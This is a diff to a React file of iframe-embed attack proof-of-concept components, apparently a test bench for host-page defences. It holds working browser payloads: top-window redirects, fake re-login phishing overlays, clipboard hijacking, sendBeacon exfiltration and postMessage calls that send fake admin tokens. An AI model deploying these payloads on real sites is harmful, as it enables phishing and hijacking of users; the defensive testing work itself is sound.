@@ -1,7 +1,10 @@
 "use client";
 
-import { useState } from "react";
 import { EmbedShell, IEmbedAction } from "./EmbedShell";
+
+import { buildRedirectTarget } from "@/lib/redirectTarget";
+import { useEmbedContext } from "./EmbedContext";
+import { useState } from "react";
 
 type Push = (s: string) => void;
 
@@ -10,41 +13,50 @@ type Push = (s: string) => void;
  * 각 컴포넌트는 EmbedShell 을 wrap 해서 title + actions + (optional UI).
  * ============================================================ */
 
-const TopRedirect = () => (
-  <EmbedShell
-    title="top.location 강제 리다이렉트"
-    actions={[
-      {
-        label: "top.location 변경",
-        danger: true,
-        run: (push) => {
-          try {
-            window.top!.location.href = "https://example.com/?attacker=1";
-            push("호출 완료");
-          } catch (e) {
-            push(`차단: ${(e as Error).message}`);
-          }
+const TopRedirect = () => {
+  const { locale } = useEmbedContext();
+  const target = () =>
+    buildRedirectTarget(window.location.origin, locale, "top-redirect");
+
+  return (
+    <EmbedShell
+      title="top.location 강제 리다이렉트"
+      actions={[
+        {
+          label: "top.location 변경",
+          danger: true,
+          run: (push) => {
+            try {
+              window.top!.location.href = target();
+              push("호출 완료");
+            } catch (e) {
+              push(`차단: ${(e as Error).message}`);
+            }
+          },
         },
-      },
-      {
-        label: "a target=_top click",
-        danger: true,
-        run: () => {
-          const a = document.createElement("a");
-          a.href = "https://example.com/?via-anchor=1";
-          a.target = "_top";
-          document.body.appendChild(a);
-          a.click();
-          a.remove();
+        {
+          label: "a target=_top click",
+          danger: true,
+          run: () => {
+            const a = document.createElement("a");
+            a.href = target();
+            a.target = "_top";
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+          },
         },
-      },
-    ]}
-  />
-);
+      ]}
+    />
+  );
+};
 
 const PRESET_MSGS: { label: string; data: unknown }[] = [
   { label: "string", data: "hello-attacker" },
-  { label: "auth grant", data: { type: "AUTH", token: "FAKE.JWT", role: "admin" } },
+  {
+    label: "auth grant",
+    data: { type: "AUTH", token: "FAKE.JWT", role: "admin" },
+  },
   { label: "router push", data: { type: "NAVIGATE", path: "/admin" } },
   { label: "iframe-resizer", data: { type: "iframe-resizer", height: 99999 } },
 ];
@@ -75,7 +87,7 @@ const PhishingForm = () => {
           danger: true,
           run: (push) =>
             push(
-              `email=${email || "(empty)"} pw=${pw ? "*".repeat(pw.length) : "(empty)"}`
+              `email=${email || "(empty)"} pw=${pw ? "*".repeat(pw.length) : "(empty)"}`,
             ),
         },
       ]}
@@ -106,7 +118,9 @@ const AutoDownload = () => (
         label: "Blob 다운로드",
         danger: true,
         run: (push) => {
-          const b = new Blob(["auto-downloaded payload"], { type: "text/plain" });
+          const b = new Blob(["auto-downloaded payload"], {
+            type: "text/plain",
+          });
           const u = URL.createObjectURL(b);
           const a = document.createElement("a");
           a.href = u;
@@ -122,29 +136,43 @@ const AutoDownload = () => (
   />
 );
 
-const PopupSpam = () => (
-  <EmbedShell
-    title="popup / window.open"
-    actions={[
-      {
-        label: "window.open(self)",
-        danger: true,
-        run: (push) => {
-          const w = window.open(location.href, "_blank");
-          push(w ? "열림" : "차단됨");
+const PopupSpam = () => {
+  const { locale } = useEmbedContext();
+
+  return (
+    <EmbedShell
+      title="popup / window.open"
+      actions={[
+        {
+          label: "window.open(self)",
+          danger: true,
+          run: (push) => {
+            const w = window.open(location.href, "_blank");
+            push(w ? "열림" : "차단됨");
+          },
         },
-      },
-      {
-        label: "window.open(external)",
-        danger: true,
-        run: (push) => {
-          const w = window.open("https://example.com", "_blank");
-          push(w ? "열림" : "차단됨");
+        {
+          label: "window.open(target)",
+          danger: true,
+          run: (push) => {
+            const w = window.open(
+              buildRedirectTarget(
+                window.location.origin,
+                locale,
+                "popup-spam",
+                {
+                  surface: "popup",
+                },
+              ),
+              "_blank",
+            );
+            push(w ? "열림" : "차단됨");
+          },
         },
-      },
-    ]}
-  />
-);
+      ]}
+    />
+  );
+};
 
 const AutoplayMedia = () => (
   <EmbedShell
@@ -217,7 +245,7 @@ const ClipboardHijack = () => (
               (e as ClipboardEvent).clipboardData?.setData("text/plain", evil);
               push(`hijack: 덮어쓴 값="${evil}"`);
             },
-            { once: false }
+            { once: false },
           );
           push("후크 설치 완료. 아래 텍스트를 복사해보세요.");
         },
@@ -236,7 +264,9 @@ const ClipboardHijack = () => (
       },
     ]}
   >
-    <div className="card">아무 텍스트나 선택해서 복사해 보세요. 이 줄을 시도해 보세요.</div>
+    <div className="card">
+      아무 텍스트나 선택해서 복사해 보세요. 이 줄을 시도해 보세요.
+    </div>
   </EmbedShell>
 );
 
@@ -269,10 +299,29 @@ const FullscreenOverlay = () => {
             fontFamily: "system-ui",
           }}
         >
-          <h2 style={{ marginTop: 0, color: "#111" }}>Example Workspace — 재로그인</h2>
+          <h2 style={{ marginTop: 0, color: "#111" }}>
+            Example Workspace — 재로그인
+          </h2>
           <p style={{ color: "#555" }}>(PoC 가짜 화면)</p>
-          <input placeholder="email" style={{ display: "block", margin: "6px 0", padding: 8, width: 260 }} />
-          <input placeholder="password" type="password" style={{ display: "block", margin: "6px 0", padding: 8, width: 260 }} />
+          <input
+            placeholder="email"
+            style={{
+              display: "block",
+              margin: "6px 0",
+              padding: 8,
+              width: 260,
+            }}
+          />
+          <input
+            placeholder="password"
+            type="password"
+            style={{
+              display: "block",
+              margin: "6px 0",
+              padding: 8,
+              width: 260,
+            }}
+          />
           <button onClick={() => setShow(false)} style={{ marginTop: 8 }}>
             (닫기)
           </button>
@@ -392,8 +441,8 @@ const BeaconExfil = () => (
                   ua: navigator.userAgent,
                 }),
               ],
-              { type: "application/json" }
-            )
+              { type: "application/json" },
+            ),
           );
           push(`sendBeacon=${ok}`);
         },
@@ -452,8 +501,9 @@ const TokenExfil = () => (
         danger: true,
         run: (push) => {
           push(`referrer=${document.referrer || "(empty)"}`);
-          const ao = (location as Location & { ancestorOrigins?: DOMStringList })
-            .ancestorOrigins;
+          const ao = (
+            location as Location & { ancestorOrigins?: DOMStringList }
+          ).ancestorOrigins;
           push(`ancestorOrigins=${JSON.stringify(ao ? Array.from(ao) : null)}`);
           [
             { type: "GET_TOKEN" },
@@ -464,7 +514,7 @@ const TokenExfil = () => (
             setTimeout(() => {
               window.parent.postMessage(p, "*");
               push(`sent: ${JSON.stringify(p)}`);
-            }, i * 250)
+            }, i * 250),
           );
           setTimeout(() => {
             try {
@@ -505,7 +555,7 @@ const ParentListenerProbe = () => {
               setTimeout(() => {
                 window.parent.postMessage(p, "*");
                 push(`sent: ${JSON.stringify(p).slice(0, 80)}`);
-              }, i * 250)
+              }, i * 250),
             );
           },
         },
@@ -514,37 +564,43 @@ const ParentListenerProbe = () => {
   );
 };
 
-const DelayedAttack = () => (
-  <EmbedShell
-    title="지연 / 자동 실행"
-    actions={[
-      {
-        label: "top.location (즉시)",
-        danger: true,
-        run: (push) => {
-          try {
-            window.top!.location.href = "https://example.com/?delayed";
-          } catch (e) {
-            push(`차단: ${(e as Error).message}`);
-          }
+const DelayedAttack = () => {
+  const { locale } = useEmbedContext();
+
+  return (
+    <EmbedShell
+      title="지연 / 자동 실행"
+      actions={[
+        {
+          label: "top.location (즉시)",
+          danger: true,
+          run: (push) => {
+            try {
+              window.top!.location.href = buildRedirectTarget(
+                window.location.origin,
+                locale,
+                "delayed-attack",
+              );
+            } catch (e) {
+              push(`차단: ${(e as Error).message}`);
+            }
+          },
         },
-      },
-      {
-        label: "postMessage AUTH",
-        danger: true,
-        run: (push) => {
-          window.parent.postMessage(
-            { type: "AUTH", token: "FAKE" },
-            "*"
-          );
-          push("sent");
+        {
+          label: "postMessage AUTH",
+          danger: true,
+          run: (push) => {
+            window.parent.postMessage({ type: "AUTH", token: "FAKE" }, "*");
+            push("sent");
+          },
         },
-      },
-    ]}
-  />
-);
+      ]}
+    />
+  );
+};
 
 const ChainedAttack = () => {
+  const { locale } = useEmbedContext();
   const [step, setStep] = useState<"idle" | "overlay" | "done">("idle");
   return (
     <EmbedShell
@@ -575,20 +631,44 @@ const ChainedAttack = () => {
             padding: 24,
           }}
         >
-          <h2 style={{ marginTop: 0, color: "#111" }}>Example Workspace — 재로그인 필요</h2>
+          <h2 style={{ marginTop: 0, color: "#111" }}>
+            Example Workspace — 재로그인 필요
+          </h2>
           <form
             onSubmit={(e) => {
               e.preventDefault();
               setStep("done");
               try {
-                window.top!.location.href =
-                  document.referrer || "https://example.com";
+                window.top!.location.href = buildRedirectTarget(
+                  window.location.origin,
+                  locale,
+                  "chained-attack",
+                );
               } catch {}
             }}
           >
-            <input placeholder="email" style={{ display: "block", margin: "6px 0", padding: 8, width: 260 }} />
-            <input placeholder="password" type="password" style={{ display: "block", margin: "6px 0", padding: 8, width: 260 }} />
-            <button type="submit" style={{ marginTop: 6 }}>로그인</button>
+            <input
+              placeholder="email"
+              style={{
+                display: "block",
+                margin: "6px 0",
+                padding: 8,
+                width: 260,
+              }}
+            />
+            <input
+              placeholder="password"
+              type="password"
+              style={{
+                display: "block",
+                margin: "6px 0",
+                padding: 8,
+                width: 260,
+              }}
+            />
+            <button type="submit" style={{ marginTop: 6 }}>
+              로그인
+            </button>
           </form>
         </div>
       )}
